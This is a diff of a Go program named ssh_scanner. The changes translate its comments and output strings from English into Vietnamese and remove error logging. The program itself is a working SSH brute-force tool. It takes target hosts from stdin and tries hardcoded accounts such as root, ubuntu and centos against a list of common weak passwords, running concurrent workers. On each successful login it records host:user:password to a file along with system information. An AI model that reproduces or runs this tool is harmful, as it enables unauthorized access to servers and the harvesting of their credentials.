@@ -22,12 +22,12 @@ const (
 )
 
 var (
-	// Counters for statistics
+	// Bộ đếm thống kê
 	totalAttempts    int64
 	successfulLogins int64
 	failedAttempts   int64
 
-	// Predefined credentials
+	// Thông tin đăng nhập được định sẵn
 	users     = []string{"root", "ubuntu", "centos"}
 	passwords = []string{
 		"password", "123456789", "12345678", "1234567", "1234567890",
@@ -35,19 +35,19 @@ var (
 		"test", "test123", "qwerty", "password123", "123123", "abc123",
 	}
 
-	// Synchronization primitives
+	// Đồng bộ hóa
 	fileWriter    *SafeFileWriter
 	connSemaphore = make(chan struct{}, maxConcurrentConnections)
 )
 
-// SafeFileWriter provides thread-safe file writing operations
+// SafeFileWriter cung cấp các thao tác ghi file thread-safe
 type SafeFileWriter struct {
 	mu       sync.Mutex
 	filename string
 	file     *os.File
 }
 
-// NewSafeFileWriter creates a new SafeFileWriter instance
+// NewSafeFileWriter tạo một instance SafeFileWriter mới
 func NewSafeFileWriter(filename string) (*SafeFileWriter, error) {
 	file, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	if err != nil {
@@ -59,25 +59,25 @@ func NewSafeFileWriter(filename string) (*SafeFileWriter, error) {
 	}, nil
 }
 
-// Write safely writes data to the file
+// Write ghi dữ liệu vào file một cách an toàn
 func (sfw *SafeFileWriter) Write(data string) error {
 	sfw.mu.Lock()
 	defer sfw.mu.Unlock()
 	_, err := sfw.file.WriteString(data)
 	if err == nil {
-		sfw.file.Sync() // Force write to disk
+		sfw.file.Sync() // Ép buộc ghi vào đĩa
 	}
 	return err
 }
 
-// Close closes the file safely
+// Close đóng file một cách an toàn
 func (sfw *SafeFileWriter) Close() error {
 	sfw.mu.Lock()
 	defer sfw.mu.Unlock()
 	return sfw.file.Close()
 }
 
-// LoginResult represents the result of a login attempt
+// LoginResult đại diện cho kết quả của một lần thử đăng nhập
 type LoginResult struct {
 	Host       string
 	User       string
@@ -87,19 +87,19 @@ type LoginResult struct {
 	Error      error
 }
 
-// SSHClient represents an optimized SSH client
+// SSHClient đại diện cho một SSH client được tối ưu
 type SSHClient struct {
 	timeout time.Duration
 }
 
-// NewSSHClient creates a new SSH client with optimized settings
+// NewSSHClient tạo một SSH client mới với cài đặt tối ưu
 func NewSSHClient() *SSHClient {
 	return &SSHClient{
 		timeout: connectionTimeout,
 	}
 }
 
-// TryLogin attempts to login to a host with given credentials
+// TryLogin thử đăng nhập vào một host với thông tin đăng nhập đã cho
 func (c *SSHClient) TryLogin(ctx context.Context, host, user, password string) *LoginResult {
 	result := &LoginResult{
 		Host:     host,
@@ -107,8 +107,7 @@ func (c *SSHClient) TryLogin(ctx context.Context, host, user, password string) *
 		Password: password,
 		Success:  false,
 	}
-
-	// Acquire semaphore to limit concurrent connections
+	// Lấy semaphore để giới hạn kết nối đồng thời
 	select {
 	case connSemaphore <- struct{}{}:
 		defer func() { <-connSemaphore }()
@@ -186,24 +185,22 @@ func (c *SSHClient) TryLogin(ctx context.Context, host, user, password string) *
 	atomic.AddInt64(&successfulLogins, 1)
 	result.Success = true
 	result.SystemInfo = outputStr
-
-	// Log success
-	fmt.Printf("[✔] Success: %s@%s:%s\n", user, host, password)
-	fmt.Printf("→ System Info:\n%s\n", outputStr)
+	// Ghi log thành công
+	fmt.Printf("[✔] Đăng nhập thành công: %s@%s:%s\n", user, host, password)
+	fmt.Printf("→ Thông tin hệ thống:\n%s\n", outputStr)
 	fmt.Println(strings.Repeat("-", 50))
-
-	// Write to file
+	// Ghi dữ liệu vào file
 	if fileWriter != nil {
 		data := fmt.Sprintf("%s:%s:%s\n", host, user, password)
 		if err := fileWriter.Write(data); err != nil {
-			log.Printf("Failed to write to file: %v", err)
+			log.Printf("Lỗi ghi file: %v", err)
 		}
 	}
 
 	return result
 }
 
-// Worker processes targets from a channel
+// Worker xử lý các target từ channel
 func processTargets(ctx context.Context, targets <-chan string, results chan<- *LoginResult, wg *sync.WaitGroup) {
 	defer wg.Done()
 
@@ -214,7 +211,7 @@ func processTargets(ctx context.Context, targets <-chan string, results chan<- *
 		case <-ctx.Done():
 			return
 		default:
-		} // Try all credential combinations for this target
+		} // Thử tất cả các tổ hợp tài khoản cho target này
 		for _, user := range users {
 			for _, password := range passwords {
 				result := client.TryLogin(ctx, target, user, password)
@@ -234,48 +231,48 @@ func processTargets(ctx context.Context, targets <-chan string, results chan<- *
 	}
 }
 
-// printStats prints current statistics
+// printStats in thống kê hiện tại
 func printStats() {
 	total := atomic.LoadInt64(&totalAttempts)
 	success := atomic.LoadInt64(&successfulLogins)
 	failed := atomic.LoadInt64(&failedAttempts)
 
-	fmt.Printf("\n=== Statistics ===\n")
-	fmt.Printf("Total attempts: %d\n", total)
-	fmt.Printf("Successful logins: %d\n", success)
-	fmt.Printf("Failed attempts: %d\n", failed)
+	fmt.Printf("\n=== Thống kê ===\n")
+	fmt.Printf("Tổng số lần thử: %d\n", total)
+	fmt.Printf("Đăng nhập thành công: %d\n", success)
+	fmt.Printf("Thất bại: %d\n", failed)
 	if total > 0 {
-		fmt.Printf("Success rate: %.2f%%\n", float64(success)/float64(total)*100)
+		fmt.Printf("Tỷ lệ thành công: %.2f%%\n", float64(success)/float64(total)*100)
 	}
 	fmt.Println(strings.Repeat("=", 20))
 }
 
 func main() {
 	if len(os.Args) < 2 {
-		fmt.Println("Usage: ./ssh_scanner <port | listen>")
-		fmt.Println("Examples:")
+		fmt.Println("Cách sử dụng: ./ssh_scanner <port | listen>")
+		fmt.Println("Ví dụ:")
 		fmt.Println("  ./ssh_scanner 22")
 		fmt.Println("  ./ssh_scanner listen")
 		return
 	}
 
-	// Initialize file writer
+	// Khởi tạo file writer
 	var err error
 	fileWriter, err = NewSafeFileWriter(outputFileName)
 	if err != nil {
-		log.Fatalf("Failed to create file writer: %v", err)
+		log.Fatalf("Không thể tạo file writer: %v", err)
 	}
 	defer fileWriter.Close()
 
-	// Create context for graceful shutdown
+	// Tạo context để shutdown
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Create channels
+	// Tạo channels
 	targets := make(chan string, 100)
 	results := make(chan *LoginResult, 100)
 
-	// Start worker goroutines
+	// Khởi động worker goroutines
 	const numWorkers = 10
 	var wg sync.WaitGroup
 
@@ -284,20 +281,15 @@ func main() {
 		go processTargets(ctx, targets, results, &wg)
 	}
 
-	// Start result collector
+	// Khởi động result collector - chỉ xử lý kết quả, không log lỗi thường
 	go func() {
 		for result := range results {
-			if result.Error != nil && result.Error != context.Canceled {
-				// Only log significant errors, not normal auth failures
-				if !strings.Contains(result.Error.Error(), "auth") &&
-					!strings.Contains(result.Error.Error(), "connection refused") {
-					log.Printf("Error for %s@%s: %v", result.User, result.Host, result.Error)
-				}
-			}
+			// Không log lỗi thường, chỉ log lỗi nghiêm trọng
+			_ = result
 		}
 	}()
 
-	// Start statistics printer
+	// Khởi động statistics printer
 	statsTicker := time.NewTicker(30 * time.Second)
 	defer statsTicker.Stop()
 	go func() {
@@ -311,11 +303,10 @@ func main() {
 		}
 	}()
 
-	fmt.Println("SSH Scanner started. Reading targets from stdin...")
-	fmt.Printf("Max concurrent connections: %d\n", maxConcurrentConnections)
-	fmt.Printf("Connection timeout: %v\n", connectionTimeout)
-	fmt.Println(strings.Repeat("-", 50))
-	// Read targets from stdin
+	fmt.Println("SSH Scanner đã khởi động. Đang đọc targets từ stdin...")
+	fmt.Printf("Số kết nối đồng thời tối đa: %d\n", maxConcurrentConnections)
+	fmt.Printf("Timeout kết nối: %v\n", connectionTimeout)
+	fmt.Println(strings.Repeat("-", 50)) // Đọc targets từ stdin
 	scanner := bufio.NewScanner(os.Stdin)
 	targetCount := 0
 
@@ -337,7 +328,7 @@ readLoop:
 		case targets <- fullTarget:
 			targetCount++
 			if targetCount%100 == 0 {
-				fmt.Printf("Queued %d targets...\n", targetCount)
+				fmt.Printf("Đã xếp hàng %d targets...\n", targetCount)
 			}
 		case <-ctx.Done():
 			break readLoop
@@ -345,17 +336,17 @@ readLoop:
 	}
 
 	if err := scanner.Err(); err != nil {
-		log.Printf("Error reading input: %v", err)
+		log.Printf("Lỗi đọc input: %v", err)
 	}
 
-	fmt.Printf("Finished reading %d targets. Processing...\n", targetCount)
+	fmt.Printf("Hoàn thành đọc %d targets. Đang xử lý...\n", targetCount)
 
-	// Close targets channel and wait for workers to finish
+	// Đóng targets channel và chờ workers hoàn thành
 	close(targets)
 	wg.Wait()
 	close(results)
 
-	// Print final statistics
+	// In thống kê cuối cùng
 	printStats()
-	fmt.Println("Scan completed!")
+	fmt.Println("Quét hoàn tất!")
 }
